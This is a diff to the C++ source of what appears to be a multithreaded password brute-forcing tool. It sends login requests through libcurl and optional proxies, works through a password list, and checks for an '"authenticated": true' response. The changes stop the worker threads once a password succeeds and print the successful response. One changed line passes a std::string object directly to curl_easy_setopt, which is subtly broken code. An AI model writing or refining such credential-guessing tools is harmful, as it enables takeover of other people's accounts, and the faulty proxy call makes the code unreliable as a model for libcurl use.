@@ -9,6 +9,7 @@ static size_t cLine = 0;
 static size_t pLine = 0;
 string token = "";
 DWORD b = 0;
+bool ended = false;
 
 
 vector<string> args;
@@ -133,7 +134,7 @@ bool loginRequest(string username, string password, string proxy = "")
 		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 		curl_easy_setopt(curl, CURLOPT_URL, LOGIN_URL.c_str());
 		if (!proxy.empty())
-			curl_easy_setopt(curl, CURLOPT_PROXY, string("http://" + proxy).c_str());
+			curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
 		curl_easy_setopt(curl, CURLOPT_COOKIE, cookie.c_str());
 		curl_easy_setopt(curl, CURLOPT_POST, true);
 		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, true);
@@ -158,6 +159,7 @@ bool loginRequest(string username, string password, string proxy = "")
 				{
 					if (input[i].find("\"authenticated\": true") != std::string::npos)
 					{
+						printf("%s\n", input[i].c_str());
 						ret = true;
 					}
 				}
@@ -174,6 +176,7 @@ bool loginRequest(string username, string password, string proxy = "")
 
 void getResult(string password)
 {
+	ended = true;
 	for (auto t : threads)
 		t->detach();
 
@@ -191,6 +194,7 @@ void bruteForce()
 	SetConsoleTextAttribute(hConsole, 11);
 	while (cLine < passwords.size())
 	{
+		if (ended) break;
 		size_t m = cLine++;
 		size_t p = pLine++;
 
